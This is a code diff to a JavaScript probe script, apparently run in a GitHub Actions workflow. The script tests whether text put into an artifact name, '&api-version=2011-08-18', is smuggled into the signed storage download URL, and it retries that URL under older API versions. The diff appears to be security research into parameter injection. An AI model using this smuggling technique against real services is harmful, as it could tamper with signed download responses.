@@ -8,7 +8,7 @@ module.exports = async function probe({context}) {
   const [, run, job] = scope.split(':');
   const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
   const base = `${new URL(results).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
-  const name = `legacy-mime-${Date.now()}`;
+  const name = `legacy-mime-${Date.now()}&api-version=2011-08-18`;
   const body = Buffer.from('{"hello":"test"}');
 
   async function twirp(method, payload) {
@@ -62,7 +62,11 @@ module.exports = async function probe({context}) {
     headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json'},
   });
   const location = redirect.headers.get('location');
-  console.log('REST', redirect.status, location ? new URL(location).searchParams.get('rsct') : 'none');
+  const signed = location ? new URL(location) : null;
+  console.log('REST', redirect.status,
+    signed?.searchParams.get('rsct') || 'none',
+    'signed api-version', signed?.searchParams.get('api-version') || 'none',
+    'rscd contains injected text', Boolean(signed?.searchParams.get('rscd')?.includes('&api-version=2011-08-18')));
   if (!location) return;
   for (const version of [null, '2009-09-19', '2011-08-18', '2013-08-15']) {
     const url = new URL(location);
